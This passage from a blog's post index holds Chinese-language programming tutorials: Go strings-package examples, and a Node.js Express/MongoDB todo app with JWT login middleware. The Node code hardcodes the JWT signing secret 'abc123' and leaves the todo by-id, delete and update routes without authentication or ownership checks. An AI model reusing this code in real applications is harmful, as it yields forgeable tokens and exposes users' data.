123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package mainimport ( \"fmt\" \"strings\" \"unicode\")/*1、func Trim(s string, cutset string) string将字符串s中首尾包含cutset中的任一字符去掉返回2、func TrimFunc(s string, f func(rune) bool) string将字符串s首尾满足函数f(r)==true的字符去掉返回3、func TrimLeft(s string, cutset string) string将字符串s左边包含cutset中的任一字符去掉返回4、func TrimLeftFunc(s string, f func(rune) bool) string将字符串s左边满足函数f(r)==true的字符去掉返回5、func TrimRight(s string, cutset string) string将字符串s右边包含cutset中的任一字符去掉返回6、func TrimRightFunc(s string, f func(rune) bool) string将字符串s右边满足函数f(r)==true的字符去掉返回7、func TrimSpace(s string) string将字符串s首尾空白去掉返回8、func TrimPrefix(s, prefix string) string将字符串s中前缀字符串prefix去掉返回9、func TrimSuffix(s, suffix string) string将字符串s中后缀字符串prefix去掉返回 */func main() &#123; TestTrim() TestTrimFunc() TestTrimLeft() TestTrimLeftFunc() TestTrimRight() TestTrimRightFunc() TestTrimSpace() TestTrimPrefix() TestTrimSuffix()&#125;func TestTrim() &#123; fmt.Println(strings.Trim(\" steven wang \" , \" \"))//steven wang&#125;func TestTrimFunc() &#123; f := func(c rune) bool &#123; return !unicode.IsLetter(c) &amp;&amp; !unicode.IsNumber(c) &#125; fmt.Println(strings.TrimFunc(\"！@#￥%steven wang%￥#@\" , f))//steven wang&#125;func TestTrimLeft() &#123; fmt.Println(strings.TrimLeft(\" steven wang \" , \" \"))//steven wang&#125;func TestTrimLeftFunc() &#123; f := func(c rune) bool &#123; return !unicode.IsLetter(c) &amp;&amp; !unicode.IsNumber(c) &#125; fmt.Println(strings.TrimLeftFunc(\"！@#￥%steven wang%￥#@\" , f))//steven wang%￥#@&#125;func TestTrimRight() &#123; fmt.Println(strings.TrimRight(\" steven wang \" , \" \"))// steven wang&#125;func TestTrimRightFunc() &#123; f := func(c rune) bool &#123; return !unicode.IsLetter(c) &amp;&amp; !unicode.IsNumber(c) &#125; fmt.Println(strings.TrimRightFunc(\"！@#￥%steven wang%￥#@\" , f))//！@#￥%steven wang&#125;func TestTrimSpace() &#123; fmt.Println(strings.TrimSpace(\" \\t\\n a lone gopher \\n\\t\\r\\n\"))//a lone gopher&#125;func TestTrimPrefix() &#123; var s = \"Goodbye,world!\" s = strings.TrimPrefix(s, \"Goodbye\")//,world! fmt.Println(s)&#125;func TestTrimSuffix() &#123; var s = \"Hello, goodbye, etc!\" s = strings.TrimSuffix(s, \"goodbye, etc!\")//Hello, fmt.Println(s)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[24]-string-大小写转换类函数","slug":"golang-24-string-package3","date":"2018-11-30T09:26:57.000Z","updated":"2018-11-30T09:38:46.078Z","comments":true,"path":"2018/11/30/golang-24-string-package3/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-24-string-package3/","excerpt":"","text":"string-大小写转换类函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package mainimport ( \"fmt\" \"strings\")/*1、func Title(s string) string将字符串s每个单词首字母大写返回2、func ToLower(s string) string将字符串s转换成小写返回3、func ToLowerSpecial(_case unicode.SpecialCase, s string) string将字符串s中所有字符按_case指定的映射转换成小写返回4、func ToTitle(s string) string将字符串s转换成大写返回5、func ToTitleSpecial(_case unicode.SpecialCase, s string) string将字符串s中所有字符按_case指定的映射转换成大写返回6、func ToUpper(s string) string将字符串s转换成大写返回7、func ToUpperSpecial(_case unicode.SpecialCase, s string) string将字符串s中所有字符按_case指定的映射转换成大写返回 */func main() &#123; TestTitle() TestToTitle() TestToLower() TestToUpper()&#125;func TestTitle() &#123; fmt.Println(strings.Title(\"her royal highness\"))&#125;func TestToTitle() &#123; fmt.Println(strings.ToTitle(\"louD noises\"))&#125;//func TestToTitleSpecial() &#123;//&#125;func TestToLower() &#123; fmt.Println(strings.ToLower(\"Gopher\"))&#125;//func TestToLowerSpecial() &#123;////&#125;func TestToUpper() &#123; fmt.Println(strings.ToUpper(\"Gopher\"))&#125;//func TestToUpperSpecial() &#123;////&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[23]-string分割类函数","slug":"golang-23-string-package2","date":"2018-11-30T09:19:43.000Z","updated":"2018-11-30T09:38:42.534Z","comments":true,"path":"2018/11/30/golang-23-string-package2/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-23-string-package2/","excerpt":"","text":"string分割类函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package mainimport ( \"fmt\" \"strings\" \"unicode\")/*1、func Fields(s string) []string将字符串s以空白字符分割，返回一个切片2、func FieldsFunc(s string, f func(rune) bool) []string将字符串s以满足f(r)==true的字符分割，返回一个切片3、func Split(s, sep string) []string将字符串s以sep作为分隔符进行分割，分割后字符最后去掉sep4、func SplitAfter(s, sep string) []string将字符串s以sep作为分隔符进行分割，分割后字符最后附上sep5、func SplitAfterN(s, sep string, n int) []string将字符串s以sep作为分隔符进行分割，分割后字符最后附上sep，n决定返回的切片数6、func SplitN(s, sep string, n int) []string将字符串s以sep作为分隔符进行分割，分割后字符最后去掉sep，n决定返回的切片数 */func main() &#123; TestSplitAfterN()&#125;func TestFields() &#123; fmt.Println(strings.Fields(\" abc 123 ABC xyz XYZ\")) //[abc 123 ABC xyz XYZ]&#125;func TestFieldsFunc() &#123; f := func(c rune) bool &#123; //return c == '=' return !unicode.IsLetter(c) &amp;&amp; !unicode.IsNumber(c) &#125; fmt.Println(strings.FieldsFunc(\"abc@123*ABC&amp;xyz%XYZ\" , f)) //[abc 123 ABC xyz XYZ]&#125;func TestSplit() &#123; fmt.Printf(\"%q\\n\", strings.Split(\"a,b,c\", \",\"))//[a b c] fmt.Printf(\"%q\\n\", strings.Split(\"a man a plan a canal panama\", \"a \"))//[\"\" \"man \" \"plan \" \"canal panama\"] fmt.Printf(\"%q\\n\", strings.Split(\" xyz \", \"\"))//[\" \" \"x\" \"y\" \"z\" \" \"] fmt.Printf(\"%q\\n\", strings.Split(\"\", \"Bernardo O'Higgins\"))//[\"\"]&#125;func TestSplitN() &#123; fmt.Printf(\"%q\\n\", strings.SplitN(\"a,b,c\", \",\", 2))//[\"a\" \"b,c\"] fmt.Printf(\"%q\\n\", strings.SplitN(\"a,b,c\", \",\", 1))//[\"a,b,c\"]&#125;func TestSplitAfter() &#123; fmt.Printf(\"%q\\n\", strings.SplitAfter(\"a,b,c\", \",\"))//[\"a,\" \"b,\" \"c\"]&#125;func TestSplitAfterN() &#123; fmt.Printf(\"%q\\n\", strings.SplitAfterN(\"a,b,c\", \",\", 2))//[\"a,\" \"b,c\"]&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[22]-string检索类函数","slug":"golang-22-string-package","date":"2018-11-30T09:17:41.000Z","updated":"2018-11-30T09:38:39.312Z","comments":true,"path":"2018/11/30/golang-22-string-package/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-22-string-package/","excerpt":"","text":"string检索类函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142package mainimport ( \"fmt\" \"strings\" \"unicode\")/*1、func Contains(s, substr string) bool判断字符串s是否包含substr字符串2、func ContainsAny(s, chars string) bool判断字符串s是否包含chars字符串中的任一字符3、func ContainsRune(s string, r rune) bool判断字符串s是否包含unicode码值r4、func Count(s, sep string) int返回字符串s包含字符串sep的个数5、func HasPrefix(s, prefix string) bool判断字符串s是否有前缀字符串prefix6、func HasSuffix(s, suffix string) bool判断字符串s是否有后缀字符串suffix7、func Index(s, sep string) int返回字符串s中字符串sep首次出现的位置8、func IndexAny(s, chars string) int返回字符串chars中的任一unicode码值r在s中首次出现的位置9、func IndexByte(s string, c byte) int返回字符串s中字符c首次出现位置10、func IndexFunc(s string, f func(rune) bool) int返回字符串s中满足函数f(r)==true字符首次出现的位置11、func IndexRune(s string, r rune) int返回unicode码值r在字符串中首次出现的位置12、func LastIndex(s, sep string) int返回字符串s中字符串sep最后一次出现的位置13、func LastIndexAny(s, chars string) int返回字符串s中任意一个unicode码值r最后一次出现的位置14、func LastIndexByte(s string, c byte) int返回字符串s中字符c最后一次出现的位置15、func LastIndexFunc(s string, f func(rune) bool) int返回字符串s中满足函数f(r)==true字符最后一次出现的位置 */func main() &#123; TestLastIndexFunc()&#125;func TestContains() &#123; fmt.Println(strings.Contains(\"seafood\", \"foo\"))//true fmt.Println(strings.Contains(\"seafood\", \"bar\"))//false fmt.Println(strings.Contains(\"seafood\", \"\"))//true fmt.Println(strings.Contains(\"\", \"\"))//true fmt.Println(strings.Contains(\"jonson郑2008\", \"郑\"))//true&#125;func TestContainsAny() &#123; fmt.Println(strings.ContainsAny(\"team\", \"i\"))//false fmt.Println(strings.ContainsAny(\"failure\", \"u &amp; i\"))//true fmt.Println(strings.ContainsAny(\"foo\", \"\"))//false fmt.Println(strings.ContainsAny(\"\", \"\"))//false&#125;func TestContainsRune() &#123; fmt.Println(strings.ContainsRune(\"一丁丂\", '丁'))//true fmt.Println(strings.ContainsRune(\"一丁丂\", 19969))//true&#125;func TestCount() &#123; fmt.Println(strings.Count(\"cheese\", \"e\"))//3 fmt.Println(strings.Count(\"one\", \"\"))//4&#125;func TestHasPrefix() &#123; fmt.Println(strings.HasPrefix(\"1000phone news\", \"1000\"))//true fmt.Println(strings.HasPrefix(\"1000phone news\", \"1000a\"))//false&#125;func TestHasSuffix() &#123; fmt.Println(strings.HasSuffix(\"1000phone news\", \"news\"))//true fmt.Println(strings.HasSuffix(\"1000phone news\", \"new\"))//false&#125;func TestIndex() &#123; fmt.Println(strings.Index(\"chicken\", \"ken\"))//4 fmt.Println(strings.Index(\"chicken\", \"dmr\"))//-1&#125;func TestIndexAny() &#123; fmt.Println(strings.IndexAny(\"abcABC120\", \"教育基地A\"))//3&#125;func TestIndexByte() &#123; fmt.Println(strings.IndexByte(\"123abc\", 'a'))//3&#125;func TestIndexRune() &#123; fmt.Println(strings.IndexRune(\"abcABC120\", 'C'))//5 fmt.Println(strings.IndexRune(\"It培训教育\", '教'))//8&#125;func TestIndexFunc() &#123; f := func(c rune) bool &#123; return unicode.Is(unicode.Han , c) &#125; fmt.Println(strings.IndexFunc(\"Hello123,中国\" , f))//9&#125;func TestLastIndex() &#123; fmt.Println(strings.LastIndex(\"jonson learn english\", \"e\"))//13 fmt.Println(strings.Index(\"go gopher\", \"go\"))//0 fmt.Println(strings.LastIndex(\"go gopher\", \"go\"))//3 fmt.Println(strings.LastIndex(\"go gopher\", \"rodent\"))//-1&#125;func TestLastIndexAny() &#123; fmt.Println(strings.LastIndexAny(\"chicken\", \"aeiouy\"))//5 fmt.Println(strings.LastIndexAny(\"crwth\", \"aeiouy\"))//-1&#125;func TestLastIndexByte() &#123; fmt.Println(strings.LastIndexByte(\"abcABCA123\", 'A'))//6&#125;func TestLastIndexFunc() &#123; f := func(c rune) bool &#123; return unicode.Is(unicode.Han, c) &#125; fmt.Println(strings.LastIndexFunc(\"Hello,世界\", f))//9 fmt.Println(strings.LastIndexFunc(\"Hello,world中国人\", f))//17&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[21]-string类型详解","slug":"golang-21-string","date":"2018-11-30T08:43:17.000Z","updated":"2019-01-26T02:06:05.785Z","comments":true,"path":"2018/11/30/golang-21-string/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/golang-21-string/","excerpt":"","text":"string的本质 string是一个引用类型，string包含了两个部分。一个部分是指针，指向了底层的一个字节数组。另一个部分是字节数组的长度。 当复制字符串时，也只是复制了指针与长度。底层的那个字节数组是不能够改变的。 字符串使用UTF-8编码。 打印字符串 12345func main()&#123; str := &quot;跟着建勋老师学编程&quot; fmt.Println([]byte(str)) // 转换为字节数组&#125; 转换为字节数组 1234func main()&#123; str := &quot;跟着建勋老师学编程&quot; fmt.Println([]byte(str))&#125; 字符串中特殊字符 12345678910\\a U+0007 alert or bell\\b U+0008 backspace\\f U+000C form feed\\n U+000A line feed or newline\\r U+000D carriage return\\t U+0009 horizontal tab\\v U+000b vertical tab\\\\ U+005c backslash\\&apos; U+0027 single quote (valid escape only within rune literals)\\&quot; U+0022 double quote (valid escape only within string literals) 字符串长度len 1234func main()&#123; str := &quot;跟着建勋老师学编程&quot; fmt.Println(len(str)) //27 总的字节个数 &#125; 字符串序号 1234func main()&#123; str := &quot;跟着建勋老师学编程&quot; fmt.Println(str[20]) //仍然是字节&#125; 字符串slice 截断无压力 1234func main()&#123; str := &quot;跟着建勋老师学编程&quot; fmt.Println(str[3:]) //打印出：着建勋老师学编程&#125; 字符串+连接 12345func main()&#123; str1 := &quot;jonson love &quot; str2 :=&quot;olaya&quot; fmt.Println(str1+str2) //jonson love olaya&#125; Rune打印字符串 Rune为4个字节，存储国际版的字符 12345678910package mainimport &quot;fmt&quot;func main() &#123; str:=&quot;i love 建勋老师&quot; for i,ch:= range str&#123; fmt.Printf(&quot; (%d %x) &quot;,i,ch) &#125;&#125; 输出结果为：(0 69) (1 20) (2 6c) (3 6f) (4 76) (5 65) (6 20) (7 5efa) (10 52cb) (13 8001) (16 5e08) 每一个中文在底层占了3个字节，range str 时 前面的序号为所在字符的首字节位置。 循环每个字符： 1234567891011package mainimport &quot;fmt&quot;func main() &#123; str:=&quot;i love 建勋老师&quot; for i,ch:= range []rune(str)&#123; fmt.Printf(&quot; (%d %c) &quot;,i,ch) &#125;&#125; UTF8包中有不少方法，如utf8.DecodeRune为读取一个Rune以及其字节大小，案例如下： 1234567891011121314151617package mainimport ( \"fmt\" \"unicode/utf8\")func main() &#123; str:=\"i love 建勋老师\" bytes:= []byte(str) for len(bytes) &gt;0&#123; ch,size:= utf8.DecodeRune(bytes) bytes=bytes[size:] fmt.Printf(\"%c\",ch) &#125; fmt.Println()&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"nodejs渐入佳境[30]-mongodb+express+middleware绑定用户权限","slug":"node-30-bind-user-auth","date":"2018-11-30T02:56:29.000Z","updated":"2018-12-01T10:23:20.103Z","comments":true,"path":"2018/11/30/node-30-bind-user-auth/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/node-30-bind-user-auth/","excerpt":"","text":"修改todos模型 增加_creator，将用户绑定起来 123456789101112131415161718192021//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;, _creator: &#123; type: mongoose.Schema.Types.ObjectId, required: true &#125;&#125;); 添加权限控制 添加权限控制并且存储了用户的id。 用户访问/todos 必须要有authenticate这个middleware。通过以后，说明用户是可信的。就可以保存todo到数据库中。并且将todo与创建的用户链接在了一起 12345678910111213141516171819202122232425262728//express routeapp.post('/todos',authenticate,(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text, _creator:req.user._id &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', authenticate,(req, res) =&gt; &#123; Todo.find(&#123; _creator:req.user._id &#125;).then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;); 完整代码var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');const bcrypt = require('bcryptjs');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;, _creator: &#123; type: mongoose.Schema.Types.ObjectId, required: true &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.methods.removeToken = function (token) &#123; var user = this; return user.update(&#123; $pull: &#123; tokens: &#123;token&#125; &#125; &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;;UserSchema.statics.findByCredentials = function (email, password) &#123; var User = this; return User.findOne(&#123;email&#125;).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; return new Promise((resolve, reject) =&gt; &#123; // Use bcrypt.compare to compare password and user.password bcrypt.compare(password, user.password, (err, res) =&gt; &#123; if (res) &#123; resolve(user); &#125; else &#123; reject(); &#125; &#125;); &#125;); &#125;);&#125;;//在保存之前执行操作。UserSchema.pre('save', function (next) &#123; var user = this;//保存时对于密码的更新 if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; //密码变为了hash bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;);var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.delete('/users/me/token', authenticate, (req, res) =&gt; &#123; req.user.removeToken(req.token).then(() =&gt; &#123; res.status(200).send(); &#125;, () =&gt; &#123; res.status(400).send(); &#125;);&#125;);app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);// POST /users/login &#123;email, password&#125;app.post('/users/login', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); User.findByCredentials(body.email, body.password).then((user) =&gt; &#123; return user.generateAuthToken().then((token) =&gt; &#123; res.header('x-auth', token).send(user); &#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//express routeapp.post('/todos',authenticate,(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text, _creator:req.user._id &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', authenticate,(req, res) =&gt; &#123; Todo.find(&#123; _creator:req.user._id &#125;).then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 123456789101112131415161718192021222324252627282930313233343536371、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/users 保存userBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、 选择post 输入 &gt;localhost:3000/todosBody中填入：&#123; &quot;text&quot;: &quot;zhuimengshaonian07@gmail.com&quot;,&#125;header附带返回：x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8返回：&#123; &quot;completed&quot;: false, &quot;completedAt&quot;: null, &quot;_id&quot;: &quot;5c00a66978dd038d39dc4b89&quot;, &quot;text&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;_creator&quot;: &quot;5c00a58c78dd038d39dc4b87&quot;, &quot;__v&quot;: 0&#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[29]-mongodb+express+middleware删除用户权限","slug":"node-29-user-delete-token","date":"2018-11-30T02:16:09.000Z","updated":"2018-11-30T03:11:20.571Z","comments":true,"path":"2018/11/30/node-29-user-delete-token/","link":"","permalink":"https://dreamerjonson.com/2018/11/30/node-29-user-delete-token/","excerpt":"","text":"删除用户的token 12345678910UserSchema.methods.removeToken = function (token) &#123; var user = this; return user.update(&#123; $pull: &#123; tokens: &#123;token&#125; &#125; &#125;);&#125;; url 1234567app.delete('/users/me/token', authenticate, (req, res) =&gt; &#123; req.user.removeToken(req.token).then(() =&gt; &#123; res.status(200).send(); &#125;, () =&gt; &#123; res.status(400).send(); &#125;);&#125;); 完整代码var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');const bcrypt = require('bcryptjs');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.methods.removeToken = function (token) &#123; var user = this; return user.update(&#123; $pull: &#123; tokens: &#123;token&#125; &#125; &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;;UserSchema.statics.findByCredentials = function (email, password) &#123; var User = this; return User.findOne(&#123;email&#125;).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; return new Promise((resolve, reject) =&gt; &#123; // Use bcrypt.compare to compare password and user.password bcrypt.compare(password, user.password, (err, res) =&gt; &#123; if (res) &#123; resolve(user); &#125; else &#123; reject(); &#125; &#125;); &#125;); &#125;);&#125;;//在保存之前执行操作。UserSchema.pre('save', function (next) &#123; var user = this;//保存时对于密码的更新 if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; //密码变为了hash bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;);var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.delete('/users/me/token', authenticate, (req, res) =&gt; &#123; req.user.removeToken(req.token).then(() =&gt; &#123; res.status(200).send(); &#125;, () =&gt; &#123; res.status(400).send(); &#125;);&#125;);app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);// POST /users/login &#123;email, password&#125;app.post('/users/login', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); User.findByCredentials(body.email, body.password).then((user) =&gt; &#123; return user.generateAuthToken().then((token) =&gt; &#123; res.header('x-auth', token).send(user); &#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) 